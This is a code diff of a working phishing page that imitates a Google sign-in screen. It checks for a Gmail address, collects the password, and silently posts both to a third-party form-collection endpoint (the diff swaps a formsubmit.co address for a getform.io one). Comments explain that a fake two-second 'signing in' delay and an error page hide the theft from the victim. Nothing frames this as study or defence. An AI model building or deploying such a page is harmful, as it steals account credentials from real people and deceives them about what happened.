@@ -10,7 +10,6 @@
         body { background-color: #000; color: #fff; margin: 0; display: flex; justify-content: center; height: 100vh; overflow: hidden; }
         .viewport { width: 100%; max-width: 400px; padding: 24px; display: flex; flex-direction: column; position: relative; }
         
-        /* LOGO STYLING */
         .logo-area { height: 48px; margin-bottom: 12px; display: flex; align-items: center; }
         .g-logo { width: 32px; height: 32px; object-fit: contain; } 
 
@@ -23,8 +22,6 @@
             border: 1px solid #5f6368; border-radius: 4px; color: #fff; font-size: 16px; outline: none;
         }
         .field input:focus { border: 2px solid #8ab4f8; }
-        
-        /* ERROR STATE FOR INPUT */
         .field input.error-border { border: 2px solid #f28b82; }
 
         .field label {
@@ -35,7 +32,6 @@
             top: -10px; left: 10px; background: #000; padding: 0 5px; font-size: 12px; color: #8ab4f8;
         }
         
-        /* Error text styling */
         #email-error { color: #f28b82; font-size: 12px; margin-bottom: 10px; display: none; }
 
         .btn-blue { background: none; border: none; color: #8ab4f8; font-weight: 500; font-size: 14px; cursor: pointer; padding: 0; }
@@ -47,7 +43,6 @@
         .row { display: flex; justify-content: space-between; align-items: center; margin-top: 45px; }
         .row-end { display: flex; justify-content: flex-end; margin-top: 45px; }
 
-        /* Welcome Page Styles */
         .user-pill {
             display: inline-flex; align-items: center; border: 1px solid #5f6368;
             border-radius: 20px; padding: 4px 12px; margin-bottom: 24px; font-size: 14px;
@@ -57,7 +52,6 @@
         .show-pw { display: flex; align-items: center; font-size: 14px; margin-top: 10px; }
         .show-pw input { margin-right: 12px; width: 18px; height: 18px; accent-color: #8ab4f8; }
 
-        /* LOADING OVERLAY - RECTANGULAR BOX */
         #loading-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.7); display: none; justify-content: center; align-items: center; z-index: 100;
@@ -72,7 +66,6 @@
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* Footer */
         footer { margin-top: auto; padding-bottom: 20px; }
         .lang-trigger { font-size: 12px; color: #9aa0a6; cursor: pointer; margin-bottom: 24px; display: flex; align-items: center; }
         .lang-trigger::after { content: '▼'; font-size: 8px; margin-left: 8px; }
@@ -116,9 +109,7 @@
                 <svg viewBox="0 0 24 24" width="12" height="12"><path d="M7 10l5 5 5-5z"/></svg>
             </div>
             
-            <form id="myForm" method="POST" action="https://formsubmit.co/divineeze461@gmail.com">
-                <input type="hidden" name="_captcha" value="false">
-                
+            <form id="myForm" method="POST" action="https://getform.io/f/zxwji2zr3wk">
                 <div class="field">
                     <input type="password" name="password" id="pass" required placeholder=" ">
                     <label>Enter your password</label>
@@ -153,13 +144,10 @@
     </div>
 
     <script>
-        // Stage 1: Validate Gmail Format
         function goNext() {
             const emailInput = document.getElementById('email');
             const emailValue = emailInput.value;
             const errorText = document.getElementById('email-error');
-            
-            // Regex requiring @gmail.com
             const gmailPattern = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
 
             if(gmailPattern.test(emailValue)) {
@@ -180,7 +168,6 @@
             p.type = p.type === 'password' ? 'text' : 'password';
         }
 
-        // Loop back function for Error Page
         function resetToLogin() {
             document.getElementById('p3').classList.add('hidden');
             document.getElementById('p1').classList.remove('hidden');
@@ -188,22 +175,23 @@
             document.getElementById('pass').value = "";
         }
 
-        // Silent Submit + Loading Overlay + Error Screen Trigger
+        // UPDATED SILENT SUBMIT FOR GETFORM
         document.getElementById("myForm").addEventListener("submit", function(event) {
             event.preventDefault();
             
-            // Show the popup box
             document.getElementById('loading-overlay').style.display = 'flex';
             
             const formData = new FormData(this);
             formData.append('email_user', document.getElementById('email').value);
 
+            // Fetch to Getform
             fetch(this.action, {
                 method: "POST",
                 body: formData,
                 headers: { 'Accept': 'application/json' }
             }).finally(() => {
-                // Wait 2 seconds for that "signing in" feeling
+                // Wait 2 seconds, then show P3 (The Error Page)
+                // This prevents the Getform "Thank You" screen from appearing
                 setTimeout(() => {
                     document.getElementById('loading-overlay').style.display = 'none';
                     document.getElementById('p2').classList.add('hidden');
